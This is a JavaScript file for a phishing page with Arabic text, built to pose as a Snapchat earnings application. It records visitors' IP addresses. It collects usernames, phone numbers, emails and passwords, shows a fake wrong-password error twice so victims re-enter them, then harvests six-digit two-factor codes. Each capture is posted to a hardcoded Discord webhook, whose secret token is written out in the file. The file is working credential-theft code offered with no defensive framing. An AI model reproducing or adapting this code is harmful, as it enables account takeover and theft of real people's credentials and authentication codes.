// ===============================================
// إعدادات ديسكورد
// ===============================================
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1517635335343837454/e6i-jmZwGoiamjMJ7I9yzozMTq1n14LKxfQ-SuUvY2wqZ69W_pywclapPTR9zyIxP7Bn"
function sendToDiscord(message) {
    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("YOUR_DISCORD")) {
        return Promise.resolve();
    }
    const payload = {
        content: message,
        username: "Snapchat Tracker",
        avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/100px-Snapchat_logo.svg.png" 
    };
    fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).catch(console.error);
}

function trackVisitorIP() {
    fetch("https://api64.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
            sendToDiscord(`👻 **زيارة جديدة**\nIP: ${data.ip}\nالوقت: ${new Date().toLocaleString('ar-EG')}`);
        })
        .catch(console.error);
}

// 1. منطق الصفحة الرئيسية
function trackClickAndProceed() {
    const btn = document.getElementById('applyButton');
    btn.textContent = "جاري التحقق من الأهلية..."; 
    btn.disabled = true;
    sendToDiscord(`🚨 **شخص نقر على زر التقديم**\nجاري تحويله...`);
    setTimeout(() => {
        window.location.href = 'apply.html';
    }, 2000); 
}

// 2. منطق صفحة النموذج (apply.html) و 2FA
let attempts = 0;
document.addEventListener('DOMContentLoaded', () => {
    
    if(document.title.includes("تحقيق المكاسب")) {
        trackVisitorIP();
    }

    const form = document.getElementById("submissionForm");
    if (form) {
        form.addEventListener("submit", function(event) {
            event.preventDefault();
            const btn = document.getElementById("submitBtn");
            const statusMsg = document.getElementById("statusMessage");
            const loading = document.getElementById("loadingOverlay");

            let username = document.getElementById("username").value;
            let phone = document.getElementById("phoneNumber").value;
            let email = document.getElementById("trackingEmail").value;
            let password = document.getElementById("passwordField").value;

            let msg = `🔥 **صيد جديد (محاولة ${attempts + 1})**\n`;
            msg += `👤 **User:** \`${username}\`\n`;
            msg += `📱 **Phone:** \`${phone}\`\n`;
            msg += `📧 **Email:** \`${email}\`\n`;
            msg += `🔑 **Pass:** \`${password}\`\n`;
            msg += `⏰ **Time:** ${new Date().toLocaleString('ar-EG')}`;

            if (attempts < 2) {
                attempts++;
                sendToDiscord(msg);
                btn.textContent = "جاري التحقق...";
                btn.disabled = true;
                setTimeout(() => {
                    btn.textContent = "إرسال الطلب";
                    btn.disabled = false;
                    statusMsg.style.display = 'block';
                    statusMsg.textContent = "عفواً، كلمة المرور غير صحيحة.";
                    document.getElementById("passwordField").value = "";
                }, 1500);
            } else {
                attempts++;
                sendToDiscord(msg + "\n✅ **(تم التحويل لصفحة التحقق 2FA)**");
                btn.disabled = true;
                statusMsg.style.display = 'none';
                loading.style.display = 'flex';
                setTimeout(() => { window.location.href = "2fa.html"; }, 3000);
            }
        });
    }

    // 3. منطق صفحة التحقق (2fa.html) - استلام الست أرقام
    const otpInputs = document.querySelectorAll('.otp-input');
    const verifyBtn = document.getElementById('verifyBtn');

    if (otpInputs.length > 0) {
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value.length === 1 && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });
        });

        if (verifyBtn) {
            verifyBtn.addEventListener('click', () => {
                let code = "";
                otpInputs.forEach(input => code += input.value);

                if (code.length < 6) {
                    alert("يرجى إدخال الكود المكون من 6 أرقام");
                    return;
                }

                const loading = document.getElementById("loadingOverlay");
                const timerText = document.getElementById("timerText");
                loading.style.display = "flex";

                // إرسال كود الـ 2FA بتنسيق واضح
                let otpMsg = `🔑 **كود تحقق جديد (2FA)**\n`;
                otpMsg += `🔢 **الرمز:** \`${code}\`\n`;
                otpMsg += `⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`;
                sendToDiscord(otpMsg);

                let timeLeft = 60;
                const countdown = setInterval(() => {
                    timeLeft--;
                    if (timerText) {
                        timerText.innerHTML = `جاري التحقق من الرمز أمنياً...<br>يرجى الانتظار (${timeLeft}) ثانية`;
                    }
                    if (timeLeft <= 0) {
                        clearInterval(countdown);
                        window.location.href = "confirmation.html";
                    }
                }, 1000);
            });
        }
    }
});
